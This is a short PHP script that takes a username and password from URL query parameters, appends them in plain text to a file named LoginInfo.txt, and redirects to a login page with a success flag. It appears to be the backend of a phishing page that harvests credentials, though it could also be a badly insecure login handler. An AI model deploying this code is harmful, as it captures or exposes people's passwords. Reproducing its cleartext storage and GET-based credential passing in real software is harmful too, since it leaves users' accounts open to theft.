<?php
if(isset($_GET['User']) && isset($_GET['Password'])){
	$user=$_GET['User'];
	$password=($_GET['Password']);

	$file=fopen("LoginInfo.txt","a") or die("Unable to open file");
	fwrite($file,$user.",".$password."\n");
	fclose($file);

	header("Location: loginPage.php?sucess=true");
}
?>
